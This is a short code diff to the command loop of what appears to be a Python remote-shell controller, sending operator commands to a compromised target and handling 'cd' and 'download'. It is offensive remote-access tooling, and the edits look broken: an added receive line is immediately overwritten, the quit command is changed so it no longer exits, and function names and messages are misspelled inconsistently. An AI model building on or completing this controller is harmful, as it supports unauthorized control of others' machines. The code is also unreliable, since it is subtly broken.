@@ -25,12 +25,13 @@ def shell(target, ip):
                
 	global count
 	while True:
+		command = reliable_recv()
 		command = input("* Shell#-%s: " % str(ip))
 		print("Commansd came %s " % str(command))
 		relibale_send(command)
 		print("Command came %s " % str(command)) 
 		if command =='q':
-			break
+			continue
 		elif command[:2] == "cd" and len(command) >1:
 			continue
 		elif command[:8] == "download":
